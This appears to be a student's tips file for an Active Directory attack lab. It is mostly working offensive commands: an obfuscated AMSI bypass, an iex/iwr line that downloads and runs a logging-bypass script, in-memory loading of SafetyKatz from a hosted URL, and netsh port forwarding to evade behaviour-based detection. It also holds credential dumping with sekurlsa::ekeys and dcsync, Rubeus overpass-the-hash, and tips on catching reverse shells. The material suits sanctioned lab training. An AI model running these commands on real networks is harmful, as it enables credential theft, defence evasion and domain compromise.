# Tips and Tricks

- Remember to bypass AMSI on every new user and Check the Execution policy language mode
- Modify Invoke-Mimikatz.ps1 script to call the function in the script itself because we can't dot source files if in constrained language mode
- Use HFS(Http File Server) application to host scripts or payloads in windows environment.

- Use nc64.exe to catch reverse shell on windows host itself.

- If you have local administrator rights on other machines you can do anything including enabling rdp, enabling ps remoting, running script block to download tcp one liner reverse shell and executing it to catch reverse shell from script block and various other ways.

- https://github.com/Flangvik/NetLoader this can be used to load any C# binary from filepath or url, patching AMSI and unhooks ETW. ```C:\Users\Public\Loader.exe -path http://192.168.100.X/SafetyKatz.exe ```

- We also have AssemblyLoad.exe that can be used to load the Netloaderin-memory from a URL which then loads a binary from a filepathor URL. ```C:\Users\Public\AssemblyLoad.exe http://192.168.100.X/Loader.exe -path http://192.168.100.X/SafetyKatz.exe```

# Port forward to bypass behaviour based detection
- executes port forward command on dcorp-mgmt machine where anything that is sent via 172.16.100.1 student machine's port 80 is forwarded to dcorp-mgmt's loopback address via port 8080 and anything that is sent through loopback 0.0.0.0 port 8080 is forwarded to 172.16.100.1's port 80 which is the student vm respectively.
```$null | winrs -r:dcorp-mgmt "netsh interface portproxy add v4tov4 listenport=8080 listenaddress=0.0.0.0 connectport=80 connectaddress=172.16.100.1```

- Host Loader.exe via HFS on student vm and here using winrs on dcorp-mgmt machine Loader.exe will load safetykatz from http://127.0.0.1:8080/SafetyKatz.exe since port forwarding was done that anything that is sent through loopback 0.0.0.0 port 8080 is forwarded to 172.16.100.1's port 80 which is the student vm in this case  
```$null | winrs -r:dcorp-mgmt C:\Users\Public\Loader.exe -path http://127.0.0.1:8080/SafetyKatz.exe sekurlsa::ekeys exit```

- OverPassThe Hash is the way to move laterally in most cases after you get credentials of users from different machines always use overpass the hash from the initial machine where you have administrative access not from the same machine where you got the hash.

- After over pass the hash always use invisi shell in the shell as that particular user.

To copy loader or rubues or any other tool on other machine where we have administrative access. ```echo F | xcopy C:\AD\Tools\Rubeus.exe \\dcorp-appsrv\C$\Users\Public\Loader.exe /Y```

- Getting http service ticket will allow for winrs

- Always bypass script block logging after moving laterally to a machine ```iex (iwr http://172.16.100.1/sbloggingbypass.txt -UseBasicParsing)``` then bypass AMSI ```S`eT-It`em ( 'V'+'aR' +  'IA' + ('blE:1'+'q2')  + ('uZ'+'x')  ) ( [TYpE](  "{1}{0}"-F'F','rE'  ) )  ;    (    Get-varI`A`BLE  ( ('1Q'+'2U')  +'zX'  )  -VaL  )."A`ss`Embly"."GET`TY`Pe"((  "{6}{3}{1}{4}{2}{0}{5}" -f('Uti'+'l'),'A',('Am'+'si'),('.Man'+'age'+'men'+'t.'),('u'+'to'+'mation.'),'s',('Syst'+'em')  ) )."g`etf`iElD"(  ( "{0}{2}{1}" -f('a'+'msi'),'d',('I'+'nitF'+'aile')  ),(  "{2}{4}{0}{1}{3}" -f ('S'+'tat'),'i',('Non'+'Publ'+'i'),'c','c,'  ))."sE`T`VaLUE"(  ${n`ULl},${t`RuE} )```

- While extracting aes keys for machin account always use the last one as we may find multiple aeskeys from same account see the SID 2-1-5-18 is for system account use this.

- remember Use bettersafetykatz for forging tickets and safetykatz for over pass the hash and extracting credentials.

- IF we are not able to winrs or access command line using other techniques after creating golden or silver ticket in memory we can perform dcsync to extract aes hash of default administrator of moneycorp.local domain then over pass the hash```C:\AD\Tools\SafetyKatz.exe "lsadump::dcsync /user:mcorp\administrator /domain:moneycorp.local" "exit"``` then using rubeus to over pass the hash ```Rubeus.exe asktgt /user:moneycorp.local\administrator /domain:moneycorp.local /dc:mcorp-dc.moneycorp.local /aes256:a8596906b00af56 /opsec /createnetonly:C:\Windows\System32\cmd.exe /show /ptt``` then winrs to access the dc ```winrs -r:mcorp-dc cmd```

- IF injected too many tickets certain problems may arise always logoff and logon at such cases.